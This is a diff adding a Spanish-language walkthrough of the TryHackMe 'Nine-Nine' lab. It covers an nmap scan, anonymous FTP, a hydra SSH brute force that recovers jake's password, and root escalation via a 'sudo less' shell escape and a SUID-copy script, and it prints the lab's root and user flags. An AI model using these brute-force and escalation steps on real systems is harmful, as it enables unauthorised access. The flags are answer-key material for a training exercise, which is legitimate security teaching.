@@ -1,0 +1,82 @@
+Tryhackme
+Nine-Nine
+
+nmap
+nmap -p 21,22,80 -sS -sC -sV -n -Pn 10.10.249.77 -oN nmap
+
+• 21/tcp abierto  ftp vsftpd 3.0.3
+| ftp-anon: Inicio de sesión anónimo permitido (código FTP 230)
+|_-rw-r--r-- 1 0 0 119 17 de mayo de 2020 note_to_jake.txt
+• 22/tcp abierto  ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocolo 2.0)
+• 80/tcp abierto  http Apache httpd 2.4.29 (Ubuntu)
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+
+Dentro del servidor FTP, vemos que podemos ingresar de forma anónima y al hacerlo, descargamos el archivo "note_to_jake.txt".
+
+> ftp 10.10.249.77
+> usuario: anónimo
+> contraseña: (no necesaria)
+
+> get note_to_jake.txt
+
+Al leer la nota, notamos que el usuario "jake" tiene una contraseña muy débil, así que procederemos a realizar un ataque de fuerza bruta.
+
+> hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.249.77
+
+• [22][ssh] host: 10.10.249.77   login: jake   contraseña: 987654321
+
+Ahora que hemos ingresado, vamos a escalar privilegios.
+
+> find / -perm -4000 2>/dev/null
+
+• /usr/bin/pkexec 
+(vulnerable a un exploit)
+
+• /bin/less
+Vemos que GTFObins nos permite ejecutar una shell con el siguiente comando:
+
+> sudo less /etc/profile
+
+Cuando se abre el programa, introducimos el siguiente comando:
+
+> !/bin/sh
+
+Y así obtenemos una shell como root.
+
+Otra forma es crear un archivo nuevo, en este caso llamado "escala.sh" con el siguiente comando:
+**Primero accedemos a /tmp donde siempre tenemos permisos de escritura**
+
+> nano escala.sh
+
+#!/bin/bash
+sudo install -m =xs $(which less) .
+
+/bin/less /root/root.txt
+
+**guardamos**
+
+> chmod 777 escala.sh
+Damos permisos
+
+> ./escala.sh
+> contraseña de jake: 987654321
+
+•-- Creator : Fsociety2006 --
+•Congratulations in rooting Brooklyn Nine Nine
+•Here is the flag: 63a9f0ea7bb98050796b649e85481845
+
+•Enjoy!!
+•/root/root.txt (END)
+
+
+Y así obtenemos la bandera de root.
+
+Ahora buscamos la del usuario, aunque no es necesario ya que es legible para el usuario jake.
+
+> find / -name user.txt 2>/dev/null
+• /home/holt/user.txt
+
+**modificamos el script "escala.sh" y colocamos la ruta del archivo user.txt**
+
+ee11cbb19052e40b07aac0ca060c23ee
+/home/holt/user.txt (END)
